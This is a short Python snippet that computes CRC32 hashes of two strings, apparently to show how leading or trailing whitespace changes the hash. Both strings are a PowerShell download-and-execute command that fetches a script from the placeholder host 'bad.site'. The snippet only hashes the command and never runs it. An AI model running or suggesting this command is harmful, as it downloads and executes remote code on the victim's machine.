import zlib

def hash_crc32(text: str) -> str:
    b = text.encode('utf-8')
    v = zlib.crc32(b) & 0xffffffff
    return str(v)

# Exemplo
print(hash_crc32("IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1') " ))
print(hash_crc32(" IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')" ))